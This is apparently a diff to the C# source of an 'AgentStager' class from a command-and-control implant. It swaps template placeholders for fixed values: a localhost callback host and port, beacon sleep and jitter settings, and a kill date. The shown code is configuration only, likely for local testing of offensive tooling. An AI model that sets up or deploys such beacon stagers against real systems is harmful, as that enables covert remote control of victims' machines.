@@ -7,12 +7,12 @@ class AgentStager
 
     static string AgentID;
 
-    static readonly string ConnectHost = "<<ConnectHost>>";
-    static readonly int ConnectPort = int.Parse("<<ConnectPort>>");
-    static readonly int SleepInterval = int.Parse("<<SleepInterval>>");
-    static readonly int SleepJitter = int.Parse("<<SleepJitter>>");
+    static readonly string ConnectHost = "127.0.0.1";
+    static readonly int ConnectPort = int.Parse("8080");
+    static readonly int SleepInterval = int.Parse("1");
+    static readonly int SleepJitter = int.Parse("0");
 
-    static DateTime KillDate = DateTime.Parse("<<KillDate>>");
+    static DateTime KillDate = DateTime.Parse("25/09/2030 00:00:11");
 
     public AgentStager()
     {
